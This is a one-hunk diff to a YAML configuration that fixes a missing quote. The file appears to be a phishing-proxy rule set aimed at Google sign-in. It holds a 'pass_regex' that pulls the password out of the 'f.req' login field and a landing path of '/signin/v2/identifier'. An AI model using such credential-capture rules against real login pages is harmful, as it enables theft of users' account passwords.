@@ -27,4 +27,4 @@ pass_regex:
   key: 'f.req'
   re: ',\["([^"]*)",'
 landing_path:
-- '/signin/v2/identifier
+- '/signin/v2/identifier'
